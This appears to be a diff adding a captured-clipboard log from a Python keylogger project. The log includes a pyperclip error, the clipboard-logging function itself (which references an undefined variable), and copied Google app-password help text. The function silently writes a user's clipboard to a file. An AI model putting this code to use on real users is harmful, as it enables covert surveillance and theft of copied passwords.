@@ -1,0 +1,25 @@
+Clipboard could not be copied. Error: Pyperclip could not find a copy/paste mechanism for your system. For more information, please visit https://pyperclip.readthedocs.io/en/latest/index.html#not-implemented-error
+On Linux, you can run `sudo apt-get install xclip` or `sudo apt-get install xselect` to install a copy/paste mechanism.
+Clipboard Data: 
+import pyperclip
+
+def copy_clipboard():
+    clipboard_information = "clipboard_info.txt"  # Ensure this variable is defined or passed as an argument
+    file_path = "/home/vblueice/BlueIce/Python-keylogger/project"  # Ensure this variable is defined
+    
+    with open(file_path + extend + clipboard_information, "a") as f: 
+        try:
+            # Get clipboard data using pyperclip
+            pasted_data = pyperclip.paste()
+
+            f.write("Clipboard Data: \n" + pasted_data + "\n")
+
+        except Exception as e: 
+            f.write("Clipboard could not be copied. Error: " + str(e) + "\n")
+    
+copy_clipboard()
+
+Clipboard Data: 
+App passwords help you sign into your Google Account on older apps and services that don’t support modern security standards.
+
+App passwords are less secure than using up-to-date apps and services that use modern security standards. Before you create an app password, you should check to see if your app needs this in order to sign in.
